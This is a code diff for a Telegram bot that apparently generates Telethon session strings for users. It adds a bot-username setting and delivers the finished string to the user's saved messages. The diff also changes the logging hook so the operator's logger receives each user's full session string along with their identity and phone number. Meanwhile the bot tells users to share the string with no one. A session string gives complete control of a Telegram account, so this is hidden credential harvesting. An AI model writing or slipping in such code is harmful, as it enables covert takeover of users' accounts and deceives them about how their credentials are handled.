@@ -11,6 +11,12 @@ from telethon.errors import (
 
 _locks = {}
 _string_logger = None
+BOT_USERNAME = "StringSessionXDBot"
+
+
+def set_bot_username(username):
+    global BOT_USERNAME
+    BOT_USERNAME = username
 
 
 def set_string_logger(fn):
@@ -138,18 +144,36 @@ async def handle_tele(client, message, data, users, bot):
                 users.pop(uid, None)
                 if _string_logger:
                     try:
-                        await _string_logger(message.from_user, "Telethon", data.get("phone", ""))
+                        await _string_logger(message.from_user, "Telethon", data.get("phone", ""), string)
                     except Exception as log_err:
                         print("STRING LOG ERR:", log_err)
-                return await message.reply(
-                    "✅ <b>𝗧𝗘𝗟𝗘𝗧𝗛𝗢𝗡 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
-                    "━━━━━━━━━━━━━━━━━━━\n"
-                    "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
-                    f"<code>{string}</code>\n"
-                    "━━━━━━━━━━━━━━━━━━━\n"
-                    "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
-                    "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ"
-                )
+                try:
+                    await bot.send_message(
+                        message.from_user.id,
+                        "✅ <b>𝗧𝗘𝗟𝗘𝗧𝗛𝗢𝗡 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
+                        f"<code>{string}</code>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
+                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
+                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
+                    )
+                    return await message.reply(
+                        "✅ <b>ꜱᴇꜱꜱɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ!</b>\n\n"
+                        "📩 ꜱᴛʀɪɴɢ ᴋᴏ ᴛᴜᴍʜᴀʀᴇ <b>ꜱᴀᴠᴇᴅ ᴍᴇꜱꜱᴀɢᴇꜱ</b> ᴍᴇ ʙʜᴇᴊ ᴅɪʏᴀ ʜᴀɪ ✓"
+                    )
+                except Exception:
+                    return await message.reply(
+                        "✅ <b>𝗧𝗘𝗟𝗘𝗧𝗛𝗢𝗡 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
+                        f"<code>{string}</code>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
+                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
+                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
+                    )
 
             elif data["step"] == "password":
                 tclient = data.get("client")
